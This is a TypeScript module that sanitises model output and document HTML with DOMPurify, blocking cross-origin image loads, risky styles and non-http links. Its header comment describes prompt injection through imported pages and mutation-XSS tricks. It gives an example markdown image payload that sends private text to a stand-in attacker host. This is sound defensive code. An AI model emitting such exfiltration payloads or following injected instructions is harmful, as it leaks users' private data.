/**
 * HTML sanitiser for content rendered with v-html.
 *
 * Model output, document text and parsed table markup are untrusted: Markdown
 * lets raw HTML through, and an imported web page or document can steer a
 * model's answer (prompt injection), so without this a reply could run script
 * in the user's session.
 *
 * DOMPurify does the work. A hand-written sanitiser that parses, removes nodes
 * and serialises again is open to "mutation XSS": markup such as <xmp>, <noembed>
 * or an <svg>/<math> namespace switch looks harmless after the first parse but
 * turns into a live element when Vue parses the result a second time. DOMPurify
 * checks namespaces and re-parse safety. KaTeX output (spans, inline styles,
 * MathML, SVG) and citation markers (class / data-* attributes) pass through.
 *
 * Images and styles may not load anything from another site: an injected
 * ![](https://attacker/?q=<private text>) would otherwise send the text of the
 * user's sources to that site as soon as the answer is shown. Links stay, since
 * they are only followed when clicked.
 */

import DOMPurify from 'dompurify'

let configured = false

const AUTO_LOADING_ATTRIBUTES = ['src', 'srcset', 'href', 'xlink:href', 'background', 'poster']

/** True for URLs the browser would fetch from another origin (http/https/protocol-relative). */
function isCrossOriginFetch(value: string): boolean {
  const compact = value.replace(/[\u0000-\u0020\u007f-\u009f]/g, '')
  if (!compact) return false
  try {
    const url = new URL(compact, window.location.href)
    return (url.protocol === 'http:' || url.protocol === 'https:') && url.origin !== window.location.origin
  } catch {
    return true
  }
}

function configure() {
  if (configured) return
  configured = true
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    const tag = node.tagName.toLowerCase()
    // Links that open a new tab must not get a handle on this window.
    if (tag === 'a') {
      if (node.getAttribute('target') === '_blank') node.setAttribute('rel', 'noopener noreferrer')
      return
    }
    // Anything else that loads a resource by itself must stay on this site (or data:/blob:).
    for (const name of AUTO_LOADING_ATTRIBUTES) {
      const value = node.getAttribute(name)
      if (value !== null && (name === 'srcset' || isCrossOriginFetch(value))) node.removeAttribute(name)
    }
    const style = node.getAttribute('style')
    if (style && /url\s*\(|image-set\s*\(|@import/i.test(style)) node.removeAttribute('style')
  })
}

export function sanitizeHtml(html: string): string {
  if (!html) return ''
  // Fast path: nothing that could open a tag.
  if (!html.includes('<')) return html
  if (typeof window === 'undefined' || !DOMPurify.isSupported) {
    return html.replace(/[&<>"']/g, (char) => `&#${char.charCodeAt(0)};`)
  }
  configure()
  return DOMPurify.sanitize(html, {
    USE_PROFILES: { html: true, svg: true, mathMl: true },
    ADD_ATTR: ['target'],
    FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select', 'option', 'audio', 'video', 'source', 'track'],
  })
}

/**
 * Open a link from model output or a citation in a new tab, only if it is an
 * ordinary web address. A `javascript:` or `data:` URL planted in an answer
 * (for example through prompt injection in an imported page) is ignored.
 */
export function openExternalUrl(url: string | null | undefined): boolean {
  if (!url) return false
  let parsed: URL
  try {
    parsed = new URL(url, window.location.href)
  } catch {
    return false
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false
  window.open(parsed.href, '_blank', 'noopener,noreferrer')
  return true
}

/** The URL itself when it is an http(s) address, otherwise undefined (for :href bindings). */
export function safeHref(url: string | null | undefined): string | undefined {
  if (!url) return undefined
  try {
    const parsed = new URL(url, window.location.href)
    return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? url : undefined
  } catch {
    return undefined
  }
}
